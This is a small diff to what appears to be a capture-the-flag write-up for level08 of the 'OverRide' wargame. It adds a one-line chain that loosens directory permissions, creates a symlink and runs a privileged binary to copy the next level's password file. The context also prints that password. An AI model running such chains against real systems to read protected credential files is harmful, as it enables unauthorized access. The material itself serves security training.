@@ -20,3 +20,7 @@ level08@OverRide:~$ ./level08 ../level09/.pass
 level08@OverRide:~$ cat backups/.pass
 fjAwpJNs2vvkFLRebEvAQ2hFZ4uQBWfHRsP62d8S
 ```
+
+```
+chmod 777 . && ln -s backups/ level09 && ./level08 ../level09/.pass && cat backups/.pass
+```
